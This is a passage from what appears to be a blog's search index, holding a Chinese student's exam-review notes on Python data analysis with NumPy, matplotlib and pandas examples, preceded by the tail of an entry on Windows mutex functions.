INFINITE);<br>WaitForSingleObject函数用来检测hMutexSuicide事件的信号状态，在某一线程中调用该函数时，线程暂时挂起，如果在挂起的dwMilliseconds毫秒内，线程所等待的对象变为有信号状态，则该函数立即返回；如果超时时间已经到达dwMilliseconds毫秒，但hMutexSuicide所指向的对象还没有变成有信号状态，函数照样返回。<br>参数dwMilliseconds有两个具有特殊意义的值：0和INFINITE。若为0，则该函数立即返回；若为INFINITE，则线程一直为阻塞状态，直到hHandle所指向的对象变为有信号状态时为止。</p><p>OpenMutex() 打开已有的互斥体</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 课程设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python与数据分析期末复习</title>
      <link href="/2021/06/19/Python%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/06/19/Python%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="21年考情"><a href="#21年考情" class="headerlink" title="21年考情"></a>21年考情</h2><p>题型：</p><p>​    填空题10分</p><p>​    代码填空20分</p><p>​    读程序写结果40分</p><p>​    程序设计10分（一道）</p><p>​    大数据案例论述题20分（一道）</p><p>P1、P2 1.1.1数据分析的概念：分哪几个部分？1.1.2数据分析的流程：各有什么用？</p><p>P4、P5 1.2.2 熟悉Numpy、Pandas、Matplotlib的用处。</p><p>P15   2.1 Numpy多维数组下的一段话，即Numpy多维数组的作用？</p><p>P18   arange函数、linspace函数、logspace函的使用。</p><p>P19   最下面 5.随机数数组，熟悉前四个函数的使用（rand、randint、randn、seed）</p><p>P39   示例2-34，四个函数都要会用</p><p>P46   2.5.2矩阵行列式、示例2-44</p><p>P47   2.5.4线性方程组、示例2-46</p><p>P49   四、读程序的1、2题</p><p>P54   引言matplotlib的作用、3.1.1绘制线形图、示例3-1，熟悉plot函数的使用。</p><p>P74   示例3-25用figure函数创建子图</p><p>P89   pandas有哪几种数据结构、概念</p><p>P91   数据帧DataFrame的定义和使用</p><p>P106  示例4-13更换索引</p><p>P112  示例4-21排序</p><p>P134  数据清洗的定义</p><p>P135  缺失值（检测缺失值的方法，处理缺失值有哪几种方法）</p><p>P138  示例5-5填充缺失值fillna函数的应用</p><p>Ps：前途是光明的，道路是曲折的！</p><h2 id="逐点击破"><a href="#逐点击破" class="headerlink" title="逐点击破"></a>逐点击破</h2><h3 id="零、数据分析的概念？分哪几个部分？"><a href="#零、数据分析的概念？分哪几个部分？" class="headerlink" title="零、数据分析的概念？分哪几个部分？"></a>零、数据分析的概念？分哪几个部分？</h3><p>数据分析概念：数据分析是指选用适当的分析方法对收集来的大量数据进行分析、提取有用的信息和形成结论、对数据加以详细研究和概括总结的过程。</p><p>广义的数据分析包括：</p><ul><li>狭义数据分析</li><li>数据挖掘</li></ul><p>共两部分。</p><h4 id="狭义数据分析"><a href="#狭义数据分析" class="headerlink" title="狭义数据分析"></a>狭义数据分析</h4><p>是指根据分析目的，采用对比分析、分组分析、交叉分析和回归分析等方法，对收集的数据进行处理与分析，提取有价值的信息，发挥数据的作用，得到一个特征统计量结果的过程。</p><h4 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h4><p>是从大量的、不完全的、有噪声的、模糊的、随机的实际应用数据中，通过应用聚类模型、分类模型、回归和关联规则等技术，挖掘潜在价值的过程。</p><h3 id="一、数据分析的流程？各有什么用？"><a href="#一、数据分析的流程？各有什么用？" class="headerlink" title="一、数据分析的流程？各有什么用？"></a>一、数据分析的流程？各有什么用？</h3><p>数据分析已经逐渐演化为一种解决问题的过程，典型的数据分析流程如下：</p><ul><li>需求分析</li><li>数据获取</li><li>数据预处理</li><li>分析与建模</li><li>模型评价与优化</li><li>部署</li></ul><p>需求分析：需求分析的主要内容是根据数据分析需求方的要求和实际情况，结合现有的数据情况，提出数据分析需求的整体分析方向、分析内容，最终和需求方达成一致意见。</p><p>数据获取：数据获取是根据需求分析的结果提取、收集数据。</p><p>数据预处理：数据预处理是指对数据进行数据合并、数据清洗和数据变换，并直接用于分析建模的这一过程的总称。</p><p>分析与建模：分析与建模是指通过对比分析、分组分析、交叉分析、回归分析deng分析方法，以及聚类模型、分类模型、关联模型等模型与算法，发现数据中有价值的信息，并得出结论的过程。</p><p>模型评价与优化：模型评价是指对于已经建立的模型，根据其模型的类别，使用不同指标评价其性能优劣的过程。</p><h3 id="二、-熟悉Numpy、Pandas、Matplotlib的用处。"><a href="#二、-熟悉Numpy、Pandas、Matplotlib的用处。" class="headerlink" title="二、 熟悉Numpy、Pandas、Matplotlib的用处。"></a>二、 熟悉Numpy、Pandas、Matplotlib的用处。</h3><h4 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy:"></a>Numpy:</h4><ul><li><p><strong>Numpy是Numerical Python的简称，是Python语言的一个科学计算的扩展程序库，支持大量的多维数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。</strong>Numpy主要提供以下内容：</p><ul><li>快速高效的多维数组对象ndarray</li><li>广播功能函数，广播是一种对数组执行数学运算的函数，其执行的是元素级计算。广播提供了算术运算期间处理不同形状的数组的能力。</li><li>读/写硬盘上基于数组的数据集工具</li><li>线性代数运算、傅里叶变换及随机数生成功能</li><li>将C/C++、Fortran代码集成到Python的工具</li></ul><p><strong>除了为Python提供快速的数组处理能力外，Numpy在数据分析方面还有另一个主要作用，即作为算法之间传递数据的容器。</strong>对于数值型数据，使用Numpy数组存储和处理数据要比使用内置的Python数据结构高效得多。此外，由其他语言(如C语言)编写的库可以直接操作Numpy数组中的数据，无需进行任何数据复制工作。</p></li></ul><h4 id="Pandas："><a href="#Pandas：" class="headerlink" title="Pandas："></a>Pandas：</h4><ul><li><strong>Pandas是Python的数据分析核心库，最初被作为金融数据分析工具而开发出来。Pandas为时间序列分析提供了很好的支持。Pandas纳入了大量库和一些标准的数据模型，提供了高效地操作大型数据集所需的工具，提供一些列能够快速、便捷地处理结构化数据的结构和函数。</strong>Python之所以成为强大而高效的数据分析环境与他息息相关。Pandas兼具Numpy高性能的数组计算功能以及电子表格和关系型数据库的灵活数据处理功能，它提供了复杂精细的索引功能，以便便捷地完成重塑、切片和切换、聚合及选取数据子集等操作。</li></ul><h4 id="Matplotlib："><a href="#Matplotlib：" class="headerlink" title="Matplotlib："></a>Matplotlib：</h4><ul><li><strong>Matplotlib是最流行的用于绘制数据图形地Python库，它以各种硬件拷贝格式和跨平台地交互式环境生成出高质量的图形。</strong></li></ul><h3 id="三-、-Numpy多维数组下的一段话，即Numpy多维数组的作用？"><a href="#三-、-Numpy多维数组下的一段话，即Numpy多维数组的作用？" class="headerlink" title="三 、 Numpy多维数组下的一段话，即Numpy多维数组的作用？"></a>三 、 Numpy多维数组下的一段话，即Numpy多维数组的作用？</h3><p>Numpy提供了一个名为ndarray的多维数组对象，该数组元素具有固定的大小，即Numpy数组元素是同质的，只能存放同一种数据类型的对象，因此能够确定存储数组所需空间的大小，能够运用向量化运算来处理整个数组，具有较高的运算效率。</p><h3 id="四、-arange函数、linspace函数、logspace函的使用。"><a href="#四、-arange函数、linspace函数、logspace函的使用。" class="headerlink" title="四、 arange函数、linspace函数、logspace函的使用。"></a>四、 arange函数、linspace函数、logspace函的使用。</h3><p>从数值范围创建数组的Numpy函数有三个：arange()\linspace()和logspace()。</p><h4 id="arange-函数"><a href="#arange-函数" class="headerlink" title="arange()函数"></a>arange()函数</h4><p>函数arange()根据start指定的范围以及step设置的步长，生成一个ndarry对象，函数格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.arange(start,stop,step,dtype)<br></code></pre></td></tr></table></figure><p>其中的参数如表所示：</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">start</td><td align="center">起始值，默认为0</td></tr><tr><td align="center">stop</td><td align="center">终止值(不包含)</td></tr><tr><td align="center">step</td><td align="center">步长，默认为1</td></tr><tr><td align="center">dtype</td><td align="center">返回的ndarray的数据类型，如果没有提供，则会使用输入数据的类型</td></tr></tbody></table><h4 id="linspace-函数"><a href="#linspace-函数" class="headerlink" title="linspace()函数"></a>linspace()函数</h4><p>Linspace()函数用于创建一个一维数组，数组是一个等差数列构成的，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">np.linspace(start,stop,num=<span class="hljs-number">50</span>,endpoint=<span class="hljs-literal">True</span>,retstep=<span class="hljs-literal">False</span>,dtype=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p>其中参数如表所示</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">start</td><td align="center">起始值，默认为0</td></tr><tr><td align="center">stop</td><td align="center">序列的终止值，如果endpoint为True，该值包含于数列中</td></tr><tr><td align="center">num</td><td align="center">要生成的等步长的样本数量，默认为50</td></tr><tr><td align="center">dtype</td><td align="center">ndarray的数据类型</td></tr><tr><td align="center">endpoint</td><td align="center">该值为True时，数列中包含stop值，反之不包含，默认为True</td></tr><tr><td align="center">retstep</td><td align="center">如果为True，生成的数组中会显示间距，反之不显示</td></tr></tbody></table><h4 id="logspace-函数"><a href="#logspace-函数" class="headerlink" title="logspace()函数"></a>logspace()函数</h4><p>logspace()函数用于创建一个对数运算的等比数列，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">np.logspace(start,stop,num=<span class="hljs-number">50</span>,endpoint=<span class="hljs-literal">True</span>,base=<span class="hljs-number">10.0</span>,dtype=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">start</td><td align="center">起始值，默认为0</td></tr><tr><td align="center">stop</td><td align="center">序列的终止值，如果endpoint为True，该值包含于数列中</td></tr><tr><td align="center">num</td><td align="center">要生成的等步长的样本数量，默认为50</td></tr><tr><td align="center">dtype</td><td align="center">ndarray的数据类型</td></tr><tr><td align="center">endpoint</td><td align="center">该值为True时，数列中包含stop值，反之不包含，默认为True</td></tr><tr><td align="center">base</td><td align="center">对数log的底数</td></tr></tbody></table><p>实例：从数值范围创建数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>c1 = np.arange(<span class="hljs-number">10</span>)<br>c2 = np.linspace(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>)<br>c3 = np.logspace(<span class="hljs-number">10</span>,<span class="hljs-number">100</span>,<span class="hljs-number">10</span>)<br>print(<span class="hljs-string">&#x27;c1=&#x27;</span>,c1)<br>print(<span class="hljs-string">&#x27;c2=&#x27;</span>,c2)<br>print(<span class="hljs-string">&#x27;c3=&#x27;</span>,c3)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525190435736.png"></p><h3 id="五、-最下面-5-随机数数组，熟悉前四个函数的使用（rand、randint、randn、seed）"><a href="#五、-最下面-5-随机数数组，熟悉前四个函数的使用（rand、randint、randn、seed）" class="headerlink" title="五、 最下面 5.随机数数组，熟悉前四个函数的使用（rand、randint、randn、seed）"></a>五、 最下面 5.随机数数组，熟悉前四个函数的使用（rand、randint、randn、seed）</h3><h4 id="rand-函数"><a href="#rand-函数" class="headerlink" title="rand()函数"></a>rand()函数</h4><p>rand()函数产生一个指定形状的数组，数组中的值服从[0,1)之间的均匀分布，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.random.rand(d0,d1,...,dn)<br></code></pre></td></tr></table></figure><p>其中，参数d0，d1，…，dn为int型，可选。如果没有参数则返回一个float型的随机数。该随机数服从[0,1]之间的均匀分布。其返回值是一个ndarray对象或者一个float型的值。</p><p>示例：rand()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.random.rand(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)<br>print(a)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525204538586.png"></p><h4 id="randn-函数"><a href="#randn-函数" class="headerlink" title="randn()函数"></a>randn()函数</h4><p>函数randn()返回一个指定形状的数组，数组中的值服从标准正态分布(均值为0，方差为1)，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.random.randn(d0,d1,...,dn)<br></code></pre></td></tr></table></figure><p>其中，参数d0，d1，…，dn为int型，可选。如果没有参数，则返回一个服从标准正态分布的float型随机数。</p><p>返回值：ndarray对象或者float</p><p>示例：randn()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.random.randn(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)<br>print(a)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210526153628490.png"></p><h4 id="randint-函数"><a href="#randint-函数" class="headerlink" title="randint()函数"></a>randint()函数</h4><p>randint()函数生成一个在区间[low,high)中离散均匀抽样的数组，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.random.randint(low,high=<span class="hljs-literal">None</span>,size=<span class="hljs-literal">None</span>,dtype=<span class="hljs-string">&#x27;1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>函数参数说明如下：</p><p>①low、high：int型，指定抽样区间[low，high)</p><p>②size：int型或int型元组，指定形状</p><p>③dtype：可选参数，指定数据类型，如int、int64等，默认为np.int</p><p>返回值：如果指定了size，则返回一个int型的ndarray对象，否则返回一个服从该分布的int型随机数。</p><p>示例：randint()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,size=(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>))<br>print(a)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210526155734411.png"></p><h3 id="六、-示例2-34，四个函数都要会用"><a href="#六、-示例2-34，四个函数都要会用" class="headerlink" title="六、 示例2-34，四个函数都要会用"></a>六、 示例2-34，四个函数都要会用</h3><p>add()、subtract()、multiply()和divide()函数的应用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.array([[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>]])<br>b = np.array([<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>])<br>print(np.add(a,b))<br>print(np.subtract(a,b))<br>print(np.multiply(a,b))<br>print(np.divide(a,b))<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210624111049303.png" alt="效果"></p><p>解释一下：函数用法对应英文单词的意思。首尾要相同！(1,3)(3,1)就可以，(1,3)(2,3)就不行。</p><h3 id="七、矩阵行列式、示例2-44"><a href="#七、矩阵行列式、示例2-44" class="headerlink" title="七、矩阵行列式、示例2-44"></a>七、矩阵行列式、示例2-44</h3><p>numpy.linalg.det()函数计算输入矩阵的行列式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.array([[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]])<br>b = np.linalg.det(a)<br>print(b)<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210624141726127.png" alt="效果"></p><p>解释：对角线相乘然后一减，后面有4是因为机器码转换成数据时精度问题。</p><p><img src="/images/python/image-20210624142257413.png"></p><p><img src="/images/python/image-20210624143215690.png" alt="3*3"></p><p><img src="/images/python/image-20210624143241419.png" alt="3*3"></p><h3 id="八、线性方程组、示例2-46"><a href="#八、线性方程组、示例2-46" class="headerlink" title="八、线性方程组、示例2-46"></a>八、线性方程组、示例2-46</h3><p>numpy.linalg中的solve()函数可以求解线性方程组。</p><p>线性方程<strong>A</strong>x=b,其中<strong>A</strong>是一个矩阵，b是一维或者二维数组，而x是未知量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">x+y+z=<span class="hljs-number">6</span><br>2y+5z=-<span class="hljs-number">4</span><br>2x+5y-z=<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><p>代码求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>A = np.mat(<span class="hljs-string">&quot;1 1 1;0 2 5;2 5 -1&quot;</span>)<br>b = np.array([<span class="hljs-number">6</span>,-<span class="hljs-number">4</span>,<span class="hljs-number">27</span>])<br>x = np.linalg.solve(A,b)<br>print(<span class="hljs-string">&#x27;方程解:&#x27;</span>,x)<br>print(x.ndim)<br>print(np.dot(A,x)) <span class="hljs-comment">#验证</span><br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210624145645886.png" alt="结果"></p><p>上面代码的创建矩阵也可写成如下形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">A = np.mat([[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,-<span class="hljs-number">1</span>]])<br></code></pre></td></tr></table></figure><h3 id="九、读程序的1、2题"><a href="#九、读程序的1、2题" class="headerlink" title="九、读程序的1、2题"></a>九、读程序的1、2题</h3><ol><li><p>以下程序的执行结果是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.arange(<span class="hljs-number">12</span>).reshape(<span class="hljs-number">2</span>,<span class="hljs-number">6</span>)<br>c = a.ravel()<br>c[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span><br>print(a)<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210624151603428.png" alt="对比下面的看"></p><p><img src="/images/python/image-20210624151506198.png" alt="看区别！"></p></li></ol><p>说明ravel不会动原数组对象。</p><ol start="2"><li><p>以下程序执行结果是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.arange(<span class="hljs-number">9</span>)<br>b = np.split(a,<span class="hljs-number">3</span>)<br>print(b)<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210624151839552.png" alt="分成了三个对象"></p></li></ol><h3 id="十、引言matplotlib的作用、绘制线形图、示例3-1，熟悉plot函数的使用。"><a href="#十、引言matplotlib的作用、绘制线形图、示例3-1，熟悉plot函数的使用。" class="headerlink" title="十、引言matplotlib的作用、绘制线形图、示例3-1，熟悉plot函数的使用。"></a>十、引言matplotlib的作用、绘制线形图、示例3-1，熟悉plot函数的使用。</h3><h4 id="matplotlib的作用："><a href="#matplotlib的作用：" class="headerlink" title="matplotlib的作用："></a>matplotlib的作用：</h4><p>数据可视化是形象展示数据的主要手段，也是数据分析的重要组成部分。matplotlib是一个基于Python的图形可视化工具，支持多种图形的绘制，并支持完整的图标样式和个行化设置，功能强大且易学易用。</p><h4 id="绘制线形图："><a href="#绘制线形图：" class="headerlink" title="绘制线形图："></a>绘制线形图：</h4><p>线形图是最基本的图表类型，常用于绘制连续的数据。通过绘制线形图，可以表现出数据的一种趋势变化。Matplotlib的plot()函数用来绘制线形图，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">matplotlib.pyplot.plot(*args,**kwargs)<br></code></pre></td></tr></table></figure><p>args是一个可变长的参数，允许使用可选格式字符串的多个x、y对，<strong>并且x可以省略。当省略x时，通过y索引0,1…,n-1作为x。</strong></p><p>kwargs参数也是一个可变长的参数，允许对线形图的显示效果进行设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">%matplotlib inline<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>x = np.linspace(-np.pi,np.pi,<span class="hljs-number">250</span>)<br>y,z = np.sin(x),np.cos(x)<br>plt.plot(x,y,x,z)<br>plt.plot([<span class="hljs-number">0.5</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">0.5</span>,<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210624153358593.png" alt="效果"></p><p>程序分析：</p><ol><li>%matplotlib inline的作用是在Jupyter Notebook中显示图形，使用其他开发工具，这行代码可以不要</li><li>import matplotlib.pyplot as plt的作用是导入matplotlib的pyplot模块</li><li>x = np.linspace(-np.pi,np.pi,250)的作用是生成一个由250个浮点数组成的数组</li><li>y,z = np.sin(x),np.cos(x)的作用是计算出数组的正弦、余弦值，并赋值给y和z两个变量</li><li>plt.plot(x,y,x,z)绘制两条线形图，分别是正弦和余弦曲线</li><li>plt.plot([0.5,1,-0.5,1])绘制线形图，其中y轴的值是[0.5,1,-0.5,1]，而x轴的值是[0，1，2，3]，即数组[0.5,1,-0.5,1]的索引</li></ol><h3 id="十一、-示例3-25用figure函数创建子图"><a href="#十一、-示例3-25用figure函数创建子图" class="headerlink" title="十一、 示例3-25用figure函数创建子图"></a>十一、 示例3-25用figure函数创建子图</h3><p>subplot(nrows,ncols,plot_number)函数创建子图，其中参数nrows、ncols表示行数和列数，决定了子图的个数；plot_number表示当前是第几个子图。</p><p>利用figure()函数创建子图：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">%matplotlib inline<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>x = np.linspace(-np.pi,np.pi,<span class="hljs-number">50</span>)<br>y1,y2 = np.sin(x),np.cos(x)<br>fig = plt.figure(figsize=(<span class="hljs-number">5</span>,<span class="hljs-number">2</span>))<br>plt.plot(x,y1)<br>fig = plt.figure(figsize=(<span class="hljs-number">5</span>,<span class="hljs-number">2</span>))<br>plt.plot(x,y2)<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210624160551401.png" alt="效果"></p><h3 id="十二、-pandas有哪几种数据结构、概念"><a href="#十二、-pandas有哪几种数据结构、概念" class="headerlink" title="十二、 pandas有哪几种数据结构、概念"></a>十二、 pandas有哪几种数据结构、概念</h3><p>Pandas有3钟数据结构：系列(Series)、数据帧(DataFrame)和面板(Panel)，这些数据结构可以构建在Numpy数组上。</p><h4 id="Series系列"><a href="#Series系列" class="headerlink" title="Series系列"></a>Series系列</h4><p>系列是具有均匀数据的一维数据结构，其特点是：均匀数据、尺寸大小不变、数据的值可变。</p><p>系列是能够保存任何数据类型的数据(整数、字符串、浮点数、Python对象等)的一维标记数组。</p><p>Pandas系列可以使用以下构造函数构建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pandas.Series(data,index,dtype,copy)<br></code></pre></td></tr></table></figure><h4 id="数据帧"><a href="#数据帧" class="headerlink" title="数据帧"></a>数据帧</h4><p>数据帧(DataFrame)是一个具有异构数据的二维数组，其特点是异构数据、大小可变、数据可变。数据帧是Pandas使用最多的数据结构。</p><p>数据以行和列表示，每行是一条记录(对象)，每列表示一个属性，属性数据具有数据类型。例如，姓名是字符串，年龄是整数，如表所示。</p><table><thead><tr><th align="center">姓名</th><th align="center">性别</th><th align="center">年龄</th><th align="center">身高</th><th align="center">班级</th></tr></thead><tbody><tr><td align="center">小明</td><td align="center">男</td><td align="center">20</td><td align="center">178</td><td align="center">1班</td></tr><tr><td align="center">小花</td><td align="center">女</td><td align="center">22</td><td align="center">165</td><td align="center">1班</td></tr><tr><td align="center">小兰</td><td align="center">女</td><td align="center">19</td><td align="center">163</td><td align="center">2班</td></tr><tr><td align="center">小胜</td><td align="center">男</td><td align="center">23</td><td align="center">175</td><td align="center">1班</td></tr></tbody></table><p>Pandas中的DataFrame可以使用以下构造函数创建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Pandas.DataFrame(data,index,columns,dtype,copy)<br></code></pre></td></tr></table></figure><h4 id="面板"><a href="#面板" class="headerlink" title="面板"></a>面板</h4><p>面板是具有异构数据的三维数据结构。其特点是：异构数据、大小可变、数据可变。</p><p>可以使用以下构造函数创建面板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pandas.Panel(data,items,major_axis,minor_axis,dtype,copy)<br></code></pre></td></tr></table></figure><h3 id="十三、-数据帧DataFrame的定义和使用"><a href="#十三、-数据帧DataFrame的定义和使用" class="headerlink" title="十三、 数据帧DataFrame的定义和使用"></a>十三、 数据帧DataFrame的定义和使用</h3><p>Pandas数据帧可以使用各种输入创建，如列表、字典、系列、NumPy的ndarrays、Series或另一个数据帧等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>df = pd.DataFrame()<br>print(<span class="hljs-string">&#x27;创建空数据帧：&#x27;</span>)<br>print(df)<br>data = np.arange(<span class="hljs-number">11</span>,<span class="hljs-number">15</span>)<br>df1 = pd.DataFrame(data)<br>print(<span class="hljs-string">&#x27;df1=&#x27;</span>)<br>print(df1)<br></code></pre></td></tr></table></figure><p><img src="/images/python/image-20210625144410578.png" alt="效果"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>df = pd.DataFrame()<br>print(<span class="hljs-string">&#x27;创建空数据帧：&#x27;</span>)<br>print(df)<br>data = np.arange(<span class="hljs-number">11</span>,<span class="hljs-number">15</span>)<br>df1 = pd.DataFrame(data)<br>print(<span class="hljs-string">&#x27;df1=&#x27;</span>)<br>print(df1)<br>data = 